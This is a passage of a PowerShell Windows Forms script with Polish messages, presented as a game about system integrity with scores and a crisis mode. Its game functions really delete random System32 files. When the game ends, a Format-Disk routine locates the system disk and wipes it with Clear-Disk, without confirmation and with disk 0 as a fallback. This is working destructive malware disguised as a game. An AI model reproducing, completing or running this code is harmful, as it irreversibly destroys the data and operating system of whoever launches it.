function Write-Log {
 param([string]$Message, [string]$Color = "White")
 $lstLog.Items.Add("[$(Get-Date -Format 'HH:mm:ss')] $Message") | Out-Null
 $lstLog.TopIndex = $lstLog.Items.Count - 1
}

function Update-UI {
 $lblStats.Text = "INTEGRALNOŚĆ: $($GameState.Integrity)% | POZIOM: $($GameState.Level) | WYNIK: $($GameState.Score)"
 
 if ($GameState.Integrity -lt 50 -and -not $GameState.CrisisMode) {
 $GameState.CrisisMode = $true
 $Form.BackColor = [System.Drawing.Color]::DarkRed
 Write-Log "!!! TRYB KRYZYSOWY: INTEGRALNOŚĆ KRYTYCZNA !!!" "Red"
 } elseif ($GameState.Integrity -ge 50 -and $GameState.CrisisMode) {
 $GameState.CrisisMode = $false
 $Form.BackColor = [System.Drawing.Color]::Black
 Write-Log "System częściowo stabilny." "Green"
 }
}

function Check-GameOver {
 if ($GameState.Integrity -le 0) {
 $GameState.IsGameOver = $true
 $pnlGameArea.Controls.Clear()
 $lblTitle.Text = "SYSTEM ZABITY"
 $lblTitle.Font = New-Object System.Drawing.Font("Consolas", 48, [System.Drawing.FontStyle]::Bold)
 $lblTitle.ForeColor = [System.Drawing.Color]::Red
 
 $lblEnd = New-Object System.Windows.Forms.Label
 $lblEnd.Text = "FORMATOWANIE DYSKU..."
 $lblEnd.Font = New-Object System.Drawing.Font("Consolas", 24)
 $lblEnd.ForeColor = [System.Drawing.Color]::Yellow
 $lblEnd.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 100, $pnlGameArea.Height / 2 - 50)
 $pnlGameArea.Controls.Add($lblEnd)
 
 Write-Log "KONIEC GRY: FORMATOWANIE DYSKU" "Red"
 
 # Wywołaj finalne formatowanie
 Start-Sleep -Milliseconds 2000
 Format-Disk
 }
}

function Remove-SysFile {
 # Losuj plik z listy krytycznych lub z System32
 $target = $null
 
 if ($CriticalFiles.Count -gt 0) {
 $availableCritical = $CriticalFiles | Where-Object { Test-Path $_ }
 if ($availableCritical.Count -gt 0) {
 $target = $availableCritical | Get-Random
 # Usuń z listy, żeby nie usuwać tego samego
 $index = $CriticalFiles.IndexOf($target)
 if ($index -ge 0) {
 $CriticalFiles.RemoveAt($index)
 }
 }
 }
 
 if ($null -eq $target) {
 $sys32 = "$env:windir\System32"
 if (Test-Path $sys32) {
 $files = Get-ChildItem $sys32 -File -ErrorAction SilentlyContinue
 if ($files.Count -gt 0) {
 $target = ($files | Get-Random).FullName
 }
 }
 }
 
 if ($null -ne $target) {
 try {
 Remove-Item $target -Force -ErrorAction Stop
 Write-Log "PLIK USUNIĘTY: $target" "Red"
 } catch {
 Write-Log "BŁĄD USUWANIA: $target - $_" "Yellow"
 }
 }
}

function Format-Disk {
 if ($GameState.IsFormatted) { return }
 $GameState.IsFormatted = $true
 
 Write-Log "ROZPOCZĘCIE PROCEDURY USUWANIA DANYCH..." "Red"

 # --- 100% PRAWDOPODOBIEŃSTWO ---
 # Zamiast szukać po literze (co może nie istnieć), pytam system operacyjny
 # o dysk, na którym jest zainstalowany system.
 try {
     # Pobierz dysk systemowy bezpośrednio z CIM
     # To zwraca obiekt dysku, który zawiera właściwość 'Index' (Numer Dysku)
     $sysDisk = Get-CimInstance -ClassName Win32_DiskDrive | Where-Object {
         $partitions = Get-CimAssociatedInstance -InputObject $_ -Association Win32_DiskDriveToDiskPartition
         $partitions | Where-Object {
             $logicals = Get-CimAssociatedInstance -InputObject $_ -Association Win32_DiskPartitionToLogicalDisk
             $logicals | Where-Object { $_.Caption -eq (Get-CimInstance -ClassName Win32_OperatingSystem).SystemDrive }
         }
     } | Select-Object -First 1

     if ($null -ne $sysDisk) {
         $diskNumber = $sysDisk.Index
         Write-Log "WYKRYTO DYSK SYSTEMOWY: DYSK NR $diskNumber" "Cyan"
         
         try {
             Write-Log "USUWANIE PARTYCJI Z DYSKU $diskNumber..."
             Clear-Disk -Number $diskNumber -RemoveData -RemoveOEM -Confirm:$false
             Write-Log "DYSK $diskNumber ZUSUNIĘTY BEZPOWROTNIE" "Red"
         } catch {
             Write-Log "BŁĄD CZYSTY DYSKU $diskNumber: $_" "Red"
         }
     } else {
         # Fallback, jeśli CIM nie zadziała
         Write-Log "FALLBACK: Próba usunięcia dysku 0" "Yellow"
         try {
             Clear-Disk -Number 0 -RemoveData -RemoveOEM -Confirm:$false
             Write-Log "DYSK 0 USUNIĘTY" "Red"
         } catch {
             Write-Log "FALLBACK FAILED: $_" "Red"
         }
     }
 } catch {
     Write-Log "FATAL ERROR: Nie mogę znaleźć dysku systemowego. $_" "Red"
 }
 
 # Zamykamy okno gry po formatowaniu
 Start-Sleep -Milliseconds 2000
 $Form.Invoke([MethodInvoker]{ $Form.Close() })
}

